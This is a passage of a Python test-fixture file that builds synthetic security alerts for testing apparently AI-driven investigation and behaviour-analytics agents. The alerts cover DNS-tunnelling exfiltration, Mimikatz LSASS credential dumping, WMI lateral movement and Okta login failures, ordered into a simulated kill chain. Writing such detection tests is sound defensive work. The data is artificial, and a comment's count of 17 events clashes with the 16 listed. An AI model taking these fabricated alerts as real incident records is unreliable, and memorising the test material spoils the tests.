    cef_name="DNS Tunneling Detected",
    technique="T1048.003",
    tactic="Exfiltration",
    msg="Abnormal DNS query pattern indicates potential data exfiltration",
    outcome="alerted",
    extra_raw={
        "ThreatType": "DNS Tunneling",
        "Domain": "a1b2c3d4e5f6.malicioustunnel.com",
        "QueryCount": "847",
        "dst": "8.8.8.8",
        "dport": "53",
        "proto": "UDP",
        "cef_severity": 7,
    },
    test_case="T-CEF-PAN-dns_tunneling",
)

TCEF_PAN_CRED_DUMP = _make_cef_event(
    event_id="CEF-PAN-004",
    event_type="credential_dump",
    severity="critical",
    source_host="APP-SERVER-03",
    source_ip="10.60.30.67",
    user="service_account@company.com",
    product="paloalto",
    cef_class="bioc",
    cef_name="Credential Dumping Detected",
    technique="T1003.001",
    tactic="Credential Access",
    msg="LSASS process memory access detected - potential credential theft",
    outcome="blocked",
    extra_raw={
        "BehaviorIndicator": "LSASS Memory Access",
        "ProcessName": "mimikatz.exe",
        "ConfidenceScore": "95",
        "fileHash": "sha256:a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1",
        "cef_severity": 9,
    },
    test_case="T-CEF-PAN-credential_dump",
)

TCEF_PAN_WMI_LATERAL = _make_cef_event(
    event_id="CEF-PAN-005",
    event_type="lateral_movement",
    severity="critical",
    source_host="APP-SERVER-03",
    source_ip="10.60.30.67",
    user="service_account@company.com",
    product="paloalto",
    cef_class="bioc",
    cef_name="WMI Lateral Movement",
    technique="T1047",
    tactic="Lateral Movement",
    msg="WMI remote execution to target host - lateral movement indicator",
    outcome="alerted",
    extra_raw={
        "AlertId": "12346",
        "ProcessName": "WmiPrvSE.exe",
        "ConfidenceScore": "88",
        "dst": "10.60.30.99",
        "cef_severity": 9,
    },
    test_case="T-CEF-PAN-wmi_lateral",
)

# ── T-CEF-OKTA: Okta CEF events ────────────────────────────────────────

TCEF_OKTA_AUTH_SUCCESS = _make_cef_event(
    event_id="CEF-OKTA-001",
    event_type="suspicious_login",
    severity="low",
    source_host="okta-sso",
    source_ip="203.0.113.100",
    user="jdoe@company.com",
    product="okta",
    cef_class="user.session.start",
    cef_name="User Authentication Success",
    technique="",
    tactic="",
    msg="User successfully authenticated",
    outcome="success",
    extra_raw={
        "SessionId": "trs8KvP9qKLx7QbqYB7sK9wXY",
        "AuthenticationMethod": "PASSWORD",
        "DeviceType": "Computer",
        "Browser": "Chrome",
        "OS": "Windows 10",
        "EventType": "user.session.start",
        "requestClientApplication": "Okta Dashboard",
        "cef_severity": 3,
    },
    test_case="T-CEF-OKTA-auth_success",
)

TCEF_OKTA_AUTH_FAIL = _make_cef_event(
    event_id="CEF-OKTA-002",
    event_type="suspicious_login",
    severity="medium",
    source_host="okta-sso",
    source_ip="198.51.100.45",
    user="admin@company.com",
    product="okta",
    cef_class="user.session.start",
    cef_name="User Authentication Failed",
    technique="",
    tactic="",
    msg="Authentication failed - invalid password attempt",
    outcome="failure",
    extra_raw={
        "Reason": "INVALID_CREDENTIALS",
        "AuthenticationMethod": "PASSWORD",
        "DeviceType": "Computer",
        "Browser": "Firefox",
        "FailureCount": "3",
        "EventType": "user.session.start",
        "requestClientApplication": "Office 365",
        "cef_severity": 5,
    },
    test_case="T-CEF-OKTA-auth_failure",
)

TCEF_OKTA_MFA = _make_cef_event(
    event_id="CEF-OKTA-003",
    event_type="suspicious_login",
    severity="low",
    source_host="okta-sso",
    source_ip="192.0.2.78",
    user="bsmith@company.com",
    product="okta",
    cef_class="user.authentication.auth_via_mfa",
    cef_name="MFA Challenge Success",
    technique="",
    tactic="",
    msg="Multi-factor authentication successful using TOTP",
    outcome="success",
    extra_raw={
        "FactorType": "token:software:totp",
        "Provider": "OKTA",
        "DeviceType": "Mobile",
        "SessionId": "abc123xyz789def456",
        "EventType": "user.authentication.auth_via_mfa",
        "cef_severity": 4,
    },
    test_case="T-CEF-OKTA-mfa_challenge",
)

TCEF_OKTA_APP_PROVISION = _make_cef_event(
    event_id="CEF-OKTA-004",
    event_type="privilege_escalation",
    severity="low",
    source_host="okta-sso",
    source_ip="203.0.113.100",
    user="hwilliams@company.com",
    product="okta",
    cef_class="application.user_membership.add",
    cef_name="User Added to Application",
    technique="",
    tactic="",
    msg="User mjohnson@company.com added to Salesforce application",
    outcome="success",
    extra_raw={
        "ApplicationName": "Salesforce",
        "ApplicationId": "0oa1b2c3d4e5f6g7h8i9",
        "EventType": "application.user_membership.add",
        "Actor": "hwilliams@company.com",
        "Target": "mjohnson@company.com",
        "cef_severity": 3,
    },
    test_case="T-CEF-OKTA-app_provisioning",
)

TCEF_OKTA_ACCOUNT_LOCK = _make_cef_event(
    event_id="CEF-OKTA-005",
    event_type="suspicious_login",
    severity="high",
    source_host="okta-sso",
    source_ip="185.220.101.35",
    user="suspicious_user@company.com",
    product="okta",
    cef_class="user.account.lock",
    cef_name="User Account Locked Due to Suspicious Activity",
    technique="",
    tactic="",
    msg="Account locked after 10 failed login attempts from suspicious IP",
    outcome="failure",
    extra_raw={
        "Reason": "MULTIPLE_FAILED_ATTEMPTS",
        "EventType": "user.account.lock",
        "FailedAttempts": "10",
        "TimeWindow": "300",
        "GeoLocation": "Unknown Country",
        "ThreatLevel": "high",
        "cef_severity": 7,
    },
    test_case="T-CEF-OKTA-account_lock",
)

TCEF_OKTA_PASSWORD_RESET = _make_cef_event(
    event_id="CEF-OKTA-006",
    event_type="suspicious_login",
    severity="low",
    source_host="okta-sso",
    source_ip="203.0.113.150",
    user="lthompson@company.com",
    product="okta",
    cef_class="user.account.reset_password",
    cef_name="User Password Reset",
    technique="",
    tactic="",
    msg="User successfully reset password via email link",
    outcome="success",
    extra_raw={
        "EventType": "user.account.reset_password",
        "ResetMethod": "EMAIL",
        "InitiatedBy": "User",
        "DeviceType": "Computer",
        "cef_severity": 4,
    },
    test_case="T-CEF-OKTA-password_reset",
)

# ── CEF Scenario: Combined kill chain from the sample log file ──────────
# Replays the 17-event attack sequence that spans all three products,
# in approximate kill-chain order: Initial Access → Execution →
# C2 → Persistence → Lateral Movement → Credential Access →
# Exfiltration → Impact

CEF_KILL_CHAIN: List[Dict[str, Any]] = [
    TCEF_CS_MALWARE_DETECT,  # 1. Malware delivery (Initial Access)
    TCEF_CS_POWERSHELL,  # 2. PowerShell from Word (Execution)
    TCEF_CS_C2_NETWORK,  # 3. Cobalt Strike C2 beacon (C2)
    TCEF_CS_SCHEDULED_TASK,  # 4. Scheduled task persistence (Persistence)
    TCEF_CS_PSEXEC_LATERAL,  # 5. PsExec to DC (Lateral Movement)
    TCEF_PAN_WMI_LATERAL,  # 6. WMI remote exec (Lateral Movement)
    TCEF_PAN_CRED_DUMP,  # 7. Mimikatz LSASS dump (Credential Access)
    TCEF_OKTA_AUTH_FAIL,  # 8. Admin brute force (Credential Access)
    TCEF_OKTA_ACCOUNT_LOCK,  # 9. Account lockout from suspicious IP
    TCEF_PAN_BUFFER_OVERFLOW,  # 10. Browser exploit (Execution)
    TCEF_PAN_DNS_TUNNEL,  # 11. DNS tunnelling exfil (Exfiltration)
    TCEF_PAN_RANSOMWARE,  # 12. Ransomware file encryption (Impact)
    TCEF_OKTA_MFA,  # 13. MFA challenge (benign baseline)
    TCEF_OKTA_AUTH_SUCCESS,  # 14. Successful auth (benign baseline)
    TCEF_OKTA_APP_PROVISION,  # 15. App provisioning (benign baseline)
    TCEF_OKTA_PASSWORD_RESET,  # 16. Password reset (benign baseline)
]

# ── Add CEF tests to SCENARIOS and AGENT_TARGETS ───────────────────────

SCENARIOS["CEF_KILL_CHAIN"] = CEF_KILL_CHAIN

AGENT_TARGETS["CyphoraInvestigationAgent"] += [
    TCEF_CS_MALWARE_DETECT,
    TCEF_CS_C2_NETWORK,
    TCEF_CS_PSEXEC_LATERAL,
    TCEF_PAN_RANSOMWARE,
    TCEF_PAN_CRED_DUMP,
    TCEF_PAN_WMI_LATERAL,
    TCEF_PAN_DNS_TUNNEL,
    TCEF_OKTA_ACCOUNT_LOCK,
]

AGENT_TARGETS["CyphoraUEBAAgent"] += [
    TCEF_CS_POWERSHELL,
    TCEF_CS_SCHEDULED_TASK,
    TCEF_OKTA_AUTH_FAIL,
    TCEF_OKTA_ACCOUNT_LOCK,
]

# Add all CEF events to ALL_EVENTS
ALL_EVENTS.extend(CEF_KILL_CHAIN)


# ── CEF-specific helpers ───────────────────────────────────────────────


def get_cef_events_by_vendor(vendor: str) -> List[Dict[str, Any]]:
    """
    Return CEF-sourced events filtered by vendor string.
    vendor: 'crowdstrike', 'paloalto', or 'okta'
    """
    return [
        e
        for e in CEF_KILL_CHAIN
        if str(e.get("raw_data", {}).get("product", "")).startswith(vendor)
    ]


def get_cef_kill_chain() -> List[Dict[str, Any]]:
    """Return the full 16-event CEF kill chain in order."""
    return list(CEF_KILL_CHAIN)


def get_cef_raw_strings() -> Dict[str, str]:
    """Return the raw CEF log strings for parser-level testing."""
    return {
        "crowdstrike": CEF_SAMPLE_CROWDSTRIKE,
        "cortex_xdr": CEF_SAMPLE_CORTEX_XDR,
        "okta": CEF_SAMPLE_OKTA,
        "mixed": CEF_SAMPLE_MIXED,
    }
